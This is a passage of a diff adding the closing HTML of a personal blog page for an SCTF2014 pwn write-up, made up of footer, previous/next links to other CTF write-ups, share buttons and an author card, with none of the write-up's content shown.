+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Eadom. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/writeups/hctf2014final-qoobee-writeup/"
+                    data-tooltip="HCTF2014 FINAL 之pwn题qoobee1-6 writeup"
+                    aria-label="PREVIOUS: HCTF2014 FINAL 之pwn题qoobee1-6 writeup"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/"
+                    data-tooltip="HITCON CTF 2014 rsbo,finger,rsaha writeup"
+                    aria-label="NEXT: HITCON CTF 2014 rsbo,finger,rsaha writeup"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="1">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Eadom</h4>
+        
+            <div id="about-card-bio"><p>NO PWN NO FUN</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>@Alibaba</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Hangzhou
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-rmcrjyesoiaq5zeyncix4j3bagwy19cwj9vg041guvn2zdknk0vkkwd3bneh.min.js"></script>
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+
+    </body>
+</html>
